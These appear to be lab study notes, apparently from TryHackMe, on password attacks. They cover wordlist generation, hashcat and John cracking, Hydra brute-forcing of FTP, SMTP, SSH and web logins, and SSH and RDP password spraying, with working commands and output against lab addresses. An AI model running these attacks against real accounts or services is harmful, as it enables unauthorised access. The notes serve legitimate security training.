# Password Attacks

[top 100 and most common and seen passwords](https://techlabuzz.com/top-100-most-common-passwords/)  

- `Password guessing` is a technique used to target online protocols and services. Therefore, it's considered time-consuming and opens up the opportunity to generate logs for the failed login attempts. A password guessing attack conducted on a web-based system often requires a new request to be sent for each attempt, which can be easily detected. It may cause an account to be locked out if the system is designed and configured securely.
- `Password cracking` is a technique performed locally or on systems controlled by the attacker.

##  Password Profiling
### Default Passwords
- https://cirt.net/passwords
- https://default-password.info/
- https://datarecovery.com/rd/default-passwords/  

### Weak Passwords
- https://wiki.skullsecurity.org/index.php?title=Passwords - This includes the most well-known collections of passwords.
- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords) - A huge collection of all kinds of lists, not only for password cracking.

### Leaked Passwords
- [SecLists/Passwords/Leaked-Databases](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases)  

### Combined wordlists
```
cat file1.txt file2.txt file3.txt > combined_list.txt
sort combined_list.txt | uniq -u > cleaned_combined_list.txt
```

### Customized Wordlists
```
user@thm$ cewl -w list.txt -d 5 -m 5 http://thm.labs
```  
`-w` will write the contents to a file. In this case, list.txt.  
`-m 5` gathers strings (words) that are 5 characters or more  
`-d 5` is the depth level of web crawling/spidering (default 2)  
`http://thm.labs` is the URL that will be used  

### Username Wordlists
```
user@thm$ git clone https://github.com/therodri2/username_generator.git
~~~~
~~~~
user@thm$ cd username_generator
user@thm$ echo "John Smith" > users.lst
user@thm$ python3 username_generator.py -w users.lst
usage: username_generator.py [-h] -w wordlist [-u]
john
smith
j.smith
j-smith
j_smith
j+smith
jsmith
smithjohn
```

### Keyspace Technique
```
user@thm$ crunch 2 2 01234abcd -o crunch.txt
Crunch will now generate the following amount of data: 243 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: xx
crunch: 100% completed generating output
```
```
user@thm$ cat crunch.txt
00
01
02
03
04
0a
0b
0c
0d
10
.
.
.
cb
cc
cd
d0
d1
d2
d3
d4
da
db
dc
dd
```
- `@` - lower case alpha characters
- `,` - upper case alpha characters
- `%` - numeric characters
- `^` - special characters including space
```
user@thm$  crunch 6 6 -t pass%%
Crunch will now generate the following amount of data: 700 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 100
pass00
pass01
pass02
pass03
```

## Offline Attacks
### Dictionary attack
To identify the type of hash, we could a tool such as `hashid` or `hash-identifier`.  
```
user@machine$ hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
f806fc5a2a0d5ba2471600758452799c:rockyou

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: f806fc5a2a0d5ba2471600758452799c
Time.Started.....: Mon Oct 11 08:20:50 2021 (0 secs)
Time.Estimated...: Mon Oct 11 08:20:50 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   114.1 kH/s (0.02ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 40/40 (100.00%)
Rejected.........: 0/40 (0.00%)
Restore.Point....: 0/40 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> 123123

Started: Mon Oct 11 08:20:49 2021
Stopped: Mon Oct 11 08:20:52 2021
```
- `-a 0`  sets the attack mode to a dictionary attack
- `-m 0`  sets the hash mode for cracking MD5 hashes
- `--show`: show the cracked value if the hash has been cracked  

### Brute-Force attack
```
user@machine$ hashcat --help
 ? | Charset
 ===+=========
  l | abcdefghijklmnopqrstuvwxyz
  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
  d | 0123456789
  h | 0123456789abcdef
  H | 0123456789ABCDEF
  s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
  a | ?l?u?d?s
  b | 0x00 - 0xff
```
```
user@machine$ hashcat -a 3 ?d?d?d?d --stdout
1234
0234
2234
3234
9234
4234
5234
8234
7234
6234
..
..
```
- `-a 3`  sets the attacking mode as a brute-force attack
- `?d?d?d?d` the ?d tells hashcat to use a digit. In our case, ?d?d?d?d for four digits starting with 0000 and ending at 9999
- `--stdout` print the result to the terminal  
```
user@machine$ hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d
05a5cf06982ba7892ed2a6d38fe832d6:2021

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 05a5cf06982ba7892ed2a6d38fe832d6
Time.Started.....: Mon Oct 11 10:54:06 2021 (0 secs)
Time.Estimated...: Mon Oct 11 10:54:06 2021 (0 secs)
Guess.Mask.......: ?d?d?d?d [4]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 16253.6 kH/s (0.10ms) @ Accel:1024 Loops:10 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10000/10000 (100.00%)
Rejected.........: 0/10000 (0.00%)
Restore.Point....: 0/1000 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-10 Iteration:0-10
Candidates.#1....: 1234 -> 6764

Started: Mon Oct 11 10:54:05 2021
Stopped: Mon Oct 11 10:54:08 2021
```

### Rule-Based attacks
```
user@machine$ john --wordlist=single-password-list.txt --rules=KoreLogic --stdout |grep "Tryh@ckm3"
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
Tryh@ckm3
7089833p 0:00:00:02 100.00% (2021-10-11 13:56) 3016Kp/s tryhackme999999
```
`--wordlist=` to specify the wordlist or dictionary file.  
`--rules` to specify which rule or rules to use.  
`--stdout` to print the output to the terminal.  

#### Custom Rules
```
user@machine$ sudo vi /etc/john/john.conf 
[List.Rules:THM-Password-Attacks] 
Az"[0-9]" ^[!@#$]
```
`Az` represents a single word from the original wordlist/dictionary using -p.  
`"[0-9]"` append a single digit (from `0` to `9`) to the end of the word. For two digits, we can add `"[0-9][0-9]"`  and so on.   
`^[!@#$]` add a special character at the beginning of each word. `^` means the beginning of the line/word. Note, changing `^` to `$` will append the special characters to the end of the line/word.

Now let's create a file containing a single word `password` to see how we can expand our wordlist using this rule.
```
user@machine$ echo "password" > /tmp/single.lst
```
```
user@machine$ john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout 
Using default input encoding: UTF-8 
!password0 
@password0 
#password0 
$password0
```

### Online password attacks

#### Hydra
- FTP
```
user@machine$ hydra -l ftp -P passlist.txt ftp://10.10.x.x
```
`-l` ftp we are specifying a single username, use `-L` for a username wordlist  
`-P` Path specifying the full path of wordlist, you can specify a single password by using `-p`.  
`ftp://10.10.x.x` the protocol and the IP address or the fully qualified domain name (FDQN) of the target.

- SMTP
```
user@machine$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:41:08
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking smtp://10.10.x.x:25/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[25][smtp] host: 10.10.x.x   login: email@company.xyz password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

- SSH
```
user@machine$ hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:48:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking ssh://10.10.x.x:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://user@10.10.x.x:22
[INFO] Successful, password authentication is supported by ssh://10.10.x.x:22
[22][ssh] host: 10.10.x.x   login: victim   password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

- HTTP login pages
Using hydra, it is important to specify the type of HTTP request, whether `GET` or `POST`. Checking hydra options: `hydra http-get-form -U`, we can see that hydra has the following syntax for the http-get-form option:  
`<url>:<form parameters>:<condition string>[:<optional>[:<optional>]`  
```
user@machine$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 

Hydra (http://www.thc.org/thc-hydra) starting at 2021-10-13 08:06:22 
[DATA] max 16 tasks per 1 server, overall 16 tasks, 500 login tries (l:1/p:500), ~32 tries per task 
[DATA] attacking http-get-form://10.10.x.x:80//login-get/index.php:username=^USER^&password=^PASS^:S=logout.php 
[80][http-get-form] host: 10.10.x.x   login: admin password: xxxxxx 
1 of 1 target successfully completed, 1 valid password found 
Hydra (http://www.thc.org/thc-hydra) 
finished at 2021-10-13 08:06:45
```
`-l admin`  we are specifying a single username, use `-L` for a username wordlist  
`-P Path` specifying the full path of wordlist, you can specify a single password by using `-p`.  
`10.10.x.x` the IP address or the fully qualified domain name (FQDN) of the target.  
`http-get-form` the type of HTTP request, which can be either `http-get-form` or `http-post-form`.  
Next, we specify the URL, path, and conditions that are split using `:`  
`login-get/index.php` the path of the login page on the target webserver.  
`username=^USER^&password=^PASS^` the parameters to brute-force, we inject `^USER^` to brute force usernames and `^PASS^` for passwords from the specified dictionary.  

The following section is important to eliminate false positives by specifying the 'failed' condition with `F=`.  
And success conditions, `S=`. You will have more information about these conditions by analyzing the webpage or in the enumeration stage! What you set for these values depends on the response you receive back from the server for a failed login attempt and a successful login attempt. For example, if you receive a message on the webpage 'Invalid password' after a failed login, set `F=Invalid Password`.  

Or for example, during the enumeration, we found that the webserver serves `logout.php`. After logging into the login page with valid credentials, we could guess that we will have `logout.php` somewhere on the page. Therefore, we could tell hydra to look for the text logout.php within the HTML for every request.  

`S=logout.php` the success condition to identify the valid credentials  

`-f` to stop the brute-forcing attacks after finding a valid username and password  

## Password spray attack
Common and weak passwords often follow a pattern and format. Some commonly used passwords and their overall format can be found below.  

- The current season followed by the current year (SeasonYear). For example, Fall2020, Spring2021, etc.
- The current month followed by the current year (MonthYear). For example, November2020, March2021, etc.
- Using the company name along with random numbers (CompanyNameNumbers). For example, TryHackMe01, TryHackMe02.  
If a password complexity policy is enforced within the organization, we may need to create a password that includes symbols to fulfill the requirement, such as `October2021!`, `Spring2021!`, `October2021@`, etc. To be successful in the password spraying attack, we need to enumerate the target and create a list of valid usernames (or email addresses list).
- SSH
  ```
  user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
  [INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
  [22][ssh] host: 10.1.1.10 login: victim password: Spring2021
  [STATUS] attack finished for 10.1.1.10 (waiting for children to complete tests)
  1 of 1 target successfully completed, 1 valid password found
  ```
  `L` is to load the list of valid usernames, and `-p` uses the `Spring2021` password against the SSH service at `10.1.1.10`.

- RDP
  ```
  user@THM:~# python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
  [13-02-2021 16:47] - Total number of users to test: 1
  [13-02-2021 16:47] - Total number of password to test: 1
  [13-02-2021 16:47] - Total number of attempts: 1
  [13-02-2021 16:47] - [*] Started running at: 13-02-2021 16:47:40
  [13-02-2021 16:47] - [+] Cred successful (maybe even Admin access!): victim :: Spring2021!
  ```

- Outlook web access (OWA) portal
  - [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit) (atomizer.py)
  - [MailSniper](https://github.com/dafthack/MailSniper)

- SMB
  - Tool: Metasploit (auxiliary/scanner/smb/smb_login)


